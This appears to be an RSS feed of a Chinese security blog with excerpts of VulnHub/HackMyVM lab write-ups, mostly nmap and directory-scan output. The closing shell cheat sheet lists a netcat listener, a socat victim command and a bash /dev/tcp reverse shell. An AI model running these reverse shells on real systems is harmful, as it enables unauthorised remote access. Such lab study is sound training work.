+150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
+100% |*******************************************************************************************************************************************************|  8068      159.72 KiB/s    00:00 ETA
+226 Transfer complete.
+8068 bytes received in 00:00 (158.57 KiB/s)
+ftp&gt; 
+```
+有一个 .pcap 文件，get下来审计。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/Tr0ll.html</guid><pubDate>Mon, 28 Jul 2025 16:06:43 +0000</pubDate></item><item><title>holynix</title><link>https://dehua-rd.github.io/post/holynix.html</link><description># 靶机信息
+holynix是vulnhub中的一台简单难度的渗透测试靶机
+
+# 初始枚举
+## 端口扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/holynix]
+└─$ nmap -sT -p- --min-rate  1000 192.168.218.192 -oA nmapScan/ports
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 09:13 EDT
+Nmap scan report for 192.168.218.192
+Host is up (0.0011s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 00:0C:29:BC:05:DE (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
+```
+只扫出来一个80端口，利用向量很少，那就应该很简单了。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/holynix.html</guid><pubDate>Fri, 25 Jul 2025 16:02:03 +0000</pubDate></item><item><title>Prime_Series_Level-1</title><link>https://dehua-rd.github.io/post/Prime_Series_Level-1.html</link><description># 靶机信息
+Prime_Series_Level-1是vulnhub中的一台困难难度的靶机
+## 初始信息枚举
+
+tcp和udp端口扫描，尽量扫描两次，以防止网络问题造成遗漏
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ nmap -sT -p- --min-rate 10000 192.168.218.193 -oA nmapScan/tcPorts
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:46 EDT
+Nmap scan report for 192.168.218.193
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 00:0C:29:17:A8:CC (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.97 seconds
+
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ nmap -sU -p- --min-rate 10000 192.168.218.193 -oA nmapScan/udPorts
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:46 EDT
+Warning: 192.168.218.193 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.218.193
+Host is up (0.00095s latency).
+All 65535 scanned ports on 192.168.218.193 are in ignored states.
+Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
+MAC Address: 00:0C:29:17:A8:CC (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 72.89 seconds
+```
+
+指定端口进行详细服务扫描和漏洞扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ nmap -sV -p22,80 -O 192.168.218.193 -oA nmapScan/detail
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:48 EDT
+Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
+ARP Ping Scan Timing: About 100.00% done; ETC: 09:48 (0:00:00 remaining)
+Nmap scan report for 192.168.218.193
+Host is up (0.00030s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+MAC Address: 00:0C:29:17:A8:CC (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.76 seconds
+                                                              
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]                                             
+└─$ nmap --script=vuln -p22,80 192.168.218.193 -oA nmapScan/vuln                                  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:49 EDT                                   
+Nmap scan report for 192.168.218.193                                                              
+Host is up (0.00032s latency).                                                                    
+                                                                                                  
+PORT   STATE SERVICE                                                                              
+22/tcp open  ssh                                                                                  
+80/tcp open  http                                                                                 
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)                     
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                  
+|_http-csrf: Couldn't find any CSRF vulnerabilities.                                              
+|_http-dombased-xss: Couldn't find any DOM based XSS.                                             
+| http-enum:                                                                                      
+|   /wordpress/: Blog                                                                             
+|_  /wordpress/wp-login.php: Wordpress login page.                                                
+| http-slowloris-check:                                                                           
+|   VULNERABLE:                                                                                   
+|   Slowloris DOS attack                                                                          
+|     State: LIKELY VULNERABLE                                                                    
+|     IDs:  CVE:CVE-2007-6750                                                                     
+|       Slowloris tries to keep many connections to the target web server open and hold           
+|       them open as long as possible.  It accomplishes this by opening connections to            
+|       the target web server and sending a partial request. By doing so, it starves              
+|       the http server's resources causing Denial Of Service.                                    
+|                                                                                                 
+|     Disclosure date: 2009-09-17                                                                 
+|     References:                                                                                 
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                              
+|_      http://ha.ckers.org/slowloris/                                                            
+MAC Address: 00:0C:29:17:A8:CC (VMware)                                                           
+                                                                                                  
+Nmap done: 1 IP address (1 host up) scanned in 321.22 seconds   
+```
+
+信息不多，只有一个80端口开源利用，漏扫出来cms，看一下 web 页面，只有一张图片。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/Prime_Series_Level-1.html</guid><pubDate>Thu, 24 Jul 2025 19:09:25 +0000</pubDate></item><item><title>jarbas</title><link>https://dehua-rd.github.io/post/jarbas.html</link><description># 靶机信息
+jarbas是vulnhub中的一台简单类型的渗透测试靶机
+
+# 初始信息探测
+
+
+## nmap扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/jarbas]
+└─$ nmap -sT -p- --min-rate 10000 192.168.218.191 -oA nmapScan/ports
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 08:42 EDT
+Nmap scan report for 192.168.218.191
+Host is up (0.00098s latency).
+Not shown: 65531 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3306/tcp open  mysql
+8080/tcp open  http-proxy
+MAC Address: 00:0C:29:58:A8:3F (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.72 seconds
+
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/jarbas]
+└─$ nmap -sU -p- --min-rate 10000 192.168.218.191 -oA nmapScan/udp  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 08:43 EDT
+Warning: 192.168.218.191 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.218.191
+Host is up (0.00081s latency).
+Not shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
+PORT      STATE SERVICE
+33848/udp open  unknown
+MAC Address: 00:0C:29:58:A8:3F (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 72.87 seconds
+
+```
+不要忘了udp的扫描
+
+再进行详解的服务扫描和漏洞扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/jarbas]
+└─$ nmap -sV -p22,80,3306,8080 -O 192.168.218.191 -oA nmapScan/detail
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 08:50 EDT
+Nmap scan report for 192.168.218.191
+Host is up (0.00026s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
+8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
+MAC Address: 00:0C:29:58:A8:3F (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14
+Network Distance: 1 hop
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.77 seconds
+
+
+┌──(kali㉿kali)-[~]                                                                                                                                                                  08:48:02 [8/51]
+└─$ nmap --script=vuln -p22,80,3306,8080 192.168.218.191 -oA RedteamStu/stageOne/writeup/vulnhub/jarbas/nmapScan/vuln                                                                               
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 08:47 EDT                                                                                                                                     
+Nmap scan report for 192.168.218.191                                                                                                                                                                
+Host is up (0.00026s latency).                                                                                                                                                                      
+                                                                                                                                                                                                    
+PORT     STATE SERVICE                                                                                                                                                                              
+22/tcp   open  ssh                                                                                                                                                                                  
+80/tcp   open  http                                                                                                                                                                                 
+|_http-trace: TRACE is enabled
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-sql-injection: 
+|   Possible sqli for queries:
+|     http://192.168.218.191:80/index_arquivos/?C=N%3BO%3DD%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/njarb_data/?C=N%3BO%3DD%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/njarb_data/?C=S%3BO%3DA%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/njarb_data/?C=M%3BO%3DA%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/njarb_data/?C=D%3BO%3DA%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/?C=D%3BO%3DD%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider
+|     http://192.168.218.191:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider
+|_    http://192.168.218.191:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.218.191
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://192.168.218.191:80/
+|     Form id: wmtb
+|     Form action: /web/submit
+|     
+|     Path: http://192.168.218.191:80/
+|     Form id: 
+|     Form action: /web/20020720170457/http://jarbas.com.br:80/user.php
+|     
+|     Path: http://192.168.218.191:80/
+|     Form id: 
+|_    Form action: /web/20020720170457/http://jarbas.com.br:80/busca/
+| http-enum: 
+|_  /icons/: Potentially interesting folder w/ directory listing
+3306/tcp open  mysql
+8080/tcp open  http-proxy
+| http-enum: 
+|_  /robots.txt: Robots file
+MAC Address: 00:0C:29:58:A8:3F (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 39.98 seconds
+
+```
+
+## WEB枚举
+先看80端口，nmap的漏洞扫描可以扫出来了可能的漏洞，目录扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/jarbas]
+└─$ gobuster dir -u http://192.168.218.191 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,html,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.218.191
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,html,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 32808]
+/access.html          (Status: 200) [Size: 359]
+/index.html           (Status: 200) [Size: 32808]
+Progress: 224656 / 224660 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+
+┌──(kali㉿kali)-[~]                                                                                                                                                                                 
+└─$ dirsearch -u http://192.168.218.191 -e php,html,txt                                                                                                                                             
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html                    
+  from pkg_resources import DistributionNotFound, VersionConflict                                                                                                                                   
+                                                                                                                                                                                                    
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                    
+ (_||| _) (/_(_|| (_| )                                                                                                                                                                             
+                                                                                                                                                                                                    
+Extensions: php, html, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10403                                                                                                                  
+                                                                                                                                                                                                    
+Output File: /home/kali/reports/http_192.168.218.191/_25-07-23_09-09-28.txt                                                                                                                         
+                                                                                                                                                                                                    
+Target: http://192.168.218.191/                                                                                                                                                                     
+                                                                                                                                                                                                    
+[09:09:28] Starting:                                                                                                                                                                                
+[09:09:29] 403 -  213B  - /.ht_wsr.txt                                                                                                                                                              
+[09:09:29] 403 -  216B  - /.htaccess.bak1                                                                                                                                                           
+[09:09:29] 403 -  216B  - /.htaccess.orig                                                                                                                                                           
+[09:09:29] 403 -  216B  - /.htaccess.save                                                                                                                                                           
+[09:09:29] 403 -  218B  - /.htaccess.sample                                                                                                                                                         
+[09:09:29] 403 -  217B  - /.htaccess_extra                                                                                                                                                          
+[09:09:29] 403 -  214B  - /.htaccess_sc                                                                                                                                                             
+[09:09:29] 403 -  216B  - /.htaccess_orig                                                                                                                                                           
+[09:09:29] 403 -  214B  - /.htaccessBAK                                                                                                                                                             
+[09:09:29] 403 -  214B  - /.htaccessOLD                                                                                                                                                             
+[09:09:29] 403 -  215B  - /.htaccessOLD2                                                                                                                                                            
+[09:09:29] 403 -  206B  - /.htm                   
+[09:09:29] 403 -  207B  - /.html                  
+[09:09:29] 403 -  216B  - /.htpasswd_test         
+[09:09:29] 403 -  212B  - /.htpasswds
+[09:09:29] 403 -  213B  - /.httr-oauth
+[09:09:31] 200 -  359B  - /access.html            
+[09:09:36] 403 -  210B  - /cgi-bin/               
+                                                  
+Task Completed
+```
+
+以防万一都扫一下
+
+只扫出来一个access.html页面看一下，好像是三组凭证，密码加密，尝试解密，我使用的[解密网站](https://hashes.com/en/decrypt/hash)，感觉还行，三个密码都破解了。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/jarbas.html</guid><pubDate>Wed, 23 Jul 2025 12:58:03 +0000</pubDate></item><item><title>hackadmic-RTB1</title><link>https://dehua-rd.github.io/post/hackadmic-RTB1.html</link><description># 靶机信息
+hackadmic-RTB1是vulnhub平台发布的一个难度初级的渗透测试靶机
+# 初始信息收集
+## 靶机端口扫描
+tcp端口扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/hackadmic_rTB1]
+└─$ sudo nmap -sT -p- --min-rate 10000 192.168.218.190 -oA ./nmapScan/default
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:23 EDT
+Nmap scan report for 192.168.218.190
+Host is up (0.00040s latency).
+Not shown: 65520 filtered tcp ports (no-response), 13 filtered tcp ports (host-unreach)
+PORT   STATE  SERVICE
+22/tcp closed ssh
+80/tcp open   http
+MAC Address: 00:0C:29:01:8A:4D (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds
+
+```
+udp端口扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/hackadmic_rTB1]
+└─$ sudo nmap -sU -p- --min-rate 10000 192.168.218.190 -oA nmapScan/udpPort 
+[sudo] kali 的密码：
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:23 EDT
+Warning: 192.168.218.190 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.218.190
+Host is up (0.00087s latency).
+All 65535 scanned ports on 192.168.218.190 are in ignored states.
+Not shown: 65470 open|filtered udp ports (no-response), 65 filtered udp ports (host-prohibited)
+MAC Address: 00:0C:29:01:8A:4D (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 72.91 seconds
+
+```
+
+详细端口服务扫描
+```
+┌──(kali㉿kali)-[~/…/writeup/vulnhub/hackadmic_rTB1/nmapScan]
+└─$ cat detail.nmap 
+# Nmap 7.95 scan initiated Tue Jul 22 08:31:51 2025 as: /usr/lib/nmap/nmap -sCV -p22,80 -O -oA nmapScan/detail 192.168.218.190
+Nmap scan report for 192.168.218.190
+Host is up (0.00032s latency).
+
+PORT   STATE  SERVICE VERSION
+22/tcp closed ssh
+80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
+|_http-server-header: Apache/2.2.15 (Fedora)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Hackademic.RTB1  
+MAC Address: 00:0C:29:01:8A:4D (VMware)
+Device type: general purpose|media device|router|webcam|WAP
+Running (JUST GUESSING): Linux 2.6.X|3.X|5.X (98%), LG embedded (92%), MikroTik RouterOS 7.X (91%), Tandberg embedded (91%), Infomir embedded (91%)
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.10 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/h:infomir:mag-250 cpe:/o:linux:linux_kernel:2.6.32
+Aggressive OS guesses: Linux 2.6.22 - 2.6.36 (98%), Linux 2.6.23 - 2.6.38 (94%), Linux 2.6.31 - 2.6.35 (94%), Linux 2.6.32 - 2.6.39 (93%), LG Bp430 Blu-ray Player (92%), Linux 2.6.32 (92%), Linux 2.6.22 (92%), Linux 2.6.32 - 3.13 (91%), OpenWrt 22.03 (Linux 5.10) (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Jul 22 08:32:06 2025 -- 1 IP address (1 host up) scanned in 15.01 seconds
+
+```
+同时可以使用漏洞脚本扫描一下
+```
+┌──(kali㉿kali)-[~/…/writeup/vulnhub/hackadmic_rTB1/nmapScan]                                                                                                                 08:35:21 [4/82]
+└─$ sudo nmap -sC --script=vuln -p22,80 192.168.218.190 -oA vuln                                                                                                                             
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 08:32 EDT                                                                                                                              
+Nmap scan report for 192.168.218.190                                                                                                                                                         
+Host is up (0.00025s latency).                                                                                                                                                               
+
+PORT   STATE  SERVICE                                                                         
+22/tcp closed ssh                                                                             
+80/tcp open   http                                                                            
+| http-slowloris-check:                                                                       
+|   VULNERABLE:                                                                               
+|   Slowloris DOS attack                                                                      
+|     State: LIKELY VULNERABLE                                                                
+|     IDs:  CVE:CVE-2007-6750                                                                 
+|       Slowloris tries to keep many connections to the target web server open and hold                                                                                                      
+|       them open as long as possible.  It accomplishes this by opening connections to                                                                                                       
+|       the target web server and sending a partial request. By doing so, it starves                                                                                                         
+|       the http server's resources causing Denial Of Service.                                                                                                                               
+|                                                                                             
+|     Disclosure date: 2009-09-17                                                             
+|     References:                                                                             
+|       http://ha.ckers.org/slowloris/                                                        
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                                                                                                                         
+|_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                                        
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                             
+|_http-csrf: Couldn't find any CSRF vulnerabilities.                                                                                                                                         
+|_http-trace: TRACE is enabled                                                                
+| http-vuln-cve2011-3192:                                                                     
+|   VULNERABLE:                                                                               
+|   Apache byterange filter DoS                                                               
+|     State: VULNERABLE                                                                       
+|     IDs:  BID:49303  CVE:CVE-2011-3192                                                      
+|       The Apache web server is vulnerable to a denial of service attack when numerous                                                                                                      
+|       overlapping byte ranges are requested.                                                
+|     Disclosure date: 2011-08-19                                                             
+|     References:                                                                             
+|       https://www.tenable.com/plugins/nessus/55976                                                                                                                                         
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192                                                                                                                         
+|       https://seclists.org/fulldisclosure/2011/Aug/175                                                                                                                                     
+|_      https://www.securityfocus.com/bid/49303                                               
+| http-enum:                                                                                  
+|_  /icons/: Potentially interesting folder w/ directory listing                                                                                                                             
+MAC Address: 00:0C:29:01:8A:4D (VMware)                                                       
+
+Nmap done: 1 IP address (1 host up) scanned in 146.21 seconds  
+```
+借本扫描结束，只扫描到两个端口，ssh是close状态，漏洞脚本扫描都是dos攻击，没什么用，开始手工枚举信息。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/hackadmic-RTB1.html</guid><pubDate>Tue, 22 Jul 2025 17:37:55 +0000</pubDate></item><item><title>vulnhub-w1r3s</title><link>https://dehua-rd.github.io/post/vulnhub-w1r3s.html</link><description># &lt;font color='red'&gt;靶机信息&lt;/font&gt;
+W1R3S是vulnhub中的一台中等难度的靶机
+# &lt;font color='red'&gt;初始侦察&lt;/font&gt;
+## &lt;font color='yellow'&gt;靶机扫描&lt;/font&gt;
+```
+sudo nmap -sT -p- --min-rate 1000 $ip -oA tcpScan
+sudo nmap -sU -p- --min-rate 10000 $ip -oA udpScan
+```
+tcp和udp可以扫描两遍以防止失误
+
+```
+┌──(root㉿kali)-[/home/…/writeup/vulnhub/W1r3s1.0.1/nmap_scan]
+└─# grep open tcpScan.nmap | awk -F'/' '{print $1}' | paste -sd, 
+21,22,80,3306
+```
+`ports=$(grep open tcpScan.nmap | awk -F'/' '{print $1}' | paste -sd,)`
+格式化端口方便后续使用
+
+`sudo nmap -sCV -O -sT -p$ports $ip -oA detail`
+对上述扫描open的端口进行最详细的一次扫描并保存结果
+
+```
+# Nmap 7.95 scan initiated Mon Jul 21 10:50:28 2025 as: /usr/lib/nmap/nmap -sCV -sT -O -p21,22,80,3306 -oA detail 192.168.218.189
+Nmap scan report for 192.168.218.189
+Host is up (0.00051s latency).
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
+| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
+|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.218.148
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
+|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
+|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+3306/tcp open  mysql   MySQL (unauthorized)
+MAC Address: 00:0C:29:AA:7F:FC (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 5.1 - 5.15 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 4.10 (91%), Linux 4.4 (91%), OpenWrt 19.07 (Linux 4.14) (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.13 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jul 21 10:50:48 2025 -- 1 IP address (1 host up) scanned in 20.49 seconds
+                                                                                              
+```
+同时也可以使用参数--script=vuln进行漏洞扫描，不多展示
+
+# 信息利用
+## ftp枚举
+```
+┌──(root㉿kali)-[/home/…/writeup/vulnhub/W1r3s1.0.1/ftp]
+└─# ftp $ip            
+Connected to 192.168.218.189.
+220 Welcome to W1R3S.inc FTP service.
+Name (192.168.218.189:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; binary
+200 Switching to Binary mode.
+ftp&gt; 
+``` 
+直接使用匿名尝试连接登录，成功登录记得使用二进制传输模式，防止get可执行文件时放生错误，使用prompt关闭交互，使用mget，下载多个文件，将ftp中的所有文件get下来。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/vulnhub-w1r3s.html</guid><pubDate>Mon, 21 Jul 2025 18:00:53 +0000</pubDate></item><item><title>密码利用相关笔记</title><link>https://dehua-rd.github.io/post/mi-ma-li-yong-xiang-guan-bi-ji.html</link><description># 加解密
+
+## openssl
+openssl是一个强大的加密工具包，支持多种加密、解密、摘要、证书生成等操作，广泛用于安全测试、渗透测试和开发中。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/mi-ma-li-yong-xiang-guan-bi-ji.html</guid><pubDate>Mon, 21 Jul 2025 16:55:21 +0000</pubDate></item><item><title>ximai</title><link>https://dehua-rd.github.io/post/ximai.html</link><description># Hackmyvm ximai靶机
+
+
+`port=$(nmap -T4 --min-rate=1000 -p- 192.168.250.66 | awk '/^[0-9]/ {print $1}' | cut -d'/' -f1 | paste -sd,) &amp;&amp; nmap -sV -p $port $ip`
+
+&gt;Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 10:04 EDT
+Nmap scan report for 192.168.250.66
+Host is up (0.00061s latency).
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+25/tcp   open  tcpwrapped
+80/tcp   open  http       Apache httpd 2.4.62 ((Debian))
+110/tcp  open  tcpwrapped
+3306/tcp open  mysql      MariaDB 10.3.23 or earlier (unauthorized)
+8000/tcp open  http       Apache httpd 2.4.62 ((Debian))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&gt;Nmap done: 1 IP address (1 host up) scanned in 17.74 seconds
+
+先看两个http端口，80端口没东西扫描一下目录
+有一个reminder.php页面有提示
+
+
+username字段有mysql报错，但是用sqlmap没有爆出东西。</description><guid isPermaLink="true">https://dehua-rd.github.io/post/ximai.html</guid><pubDate>Wed, 09 Jul 2025 21:29:10 +0000</pubDate></item><item><title>shell相关</title><link>https://dehua-rd.github.io/post/shell-xiang-guan.html</link><description>## 交互shell
+`rlwrap -cAr nc -lvnp 1234`
+&gt;rlwrap: 为命令行提供 readline 功能（历史记录、行编辑等）
+&gt;-c: 启用命令完成
+&gt;-A: 自动完成文件名
+&gt;-r: 记住输入历史
+
+## 升级完全shell
+`python3 -c 'import pty;pty.spawn('/bin/bash')'`
+&gt;使用 Python 生成一个伪终端 (pty) 并启动 bash
+&gt;伪终端模拟了真实终端的特性，包括:
+&gt;行缓冲(Line buffering)
+&gt;信号处理(Signal handling)
+&gt;作业控制(Job control)
+&gt;这使Shell获得终端特性(TTY特性)
+
+`export SHELL=bash`
+&gt;设置正确的Shell环境变量
+&gt;确保系统知道当前使用的是Bash
+&gt;影响某些应用程序的Shell调用行为
+
+`export TERM=xterm-256color` 
+&gt;设置终端类型
+&gt;使Shell支持:
+&gt;高级终端功能
+&gt;颜色显示
+&gt;特殊按键响应
+
+**ctrl+z**
+&gt;作用：挂起当前Shell进程
+&gt;发送SIGTSTP信号
+&gt;为后续终端设置做准备
+
+`stty raw -echo;fg`
+&gt;配置终端原始模式
+&gt;raw模式：禁用输入处理，直接传递原始数据
+&gt;-echo：禁用回显(避免双重回显)
+&gt;fg：将挂起的进程带回前台
+
+`reset`
+&gt;作用：重置终端设置
+&gt;清除可能的错误配置
+&gt;确保终端处于干净状态
+&gt;重新初始化终端驱动
+
+## socat
+#### Listener:
+`socat file:`tty`,raw,echo=0 tcp-listen:4444`
+#### Victim:
+`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444`
+
+
+
+## 反向shell
+`bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1`
+不支持/dev/tcp
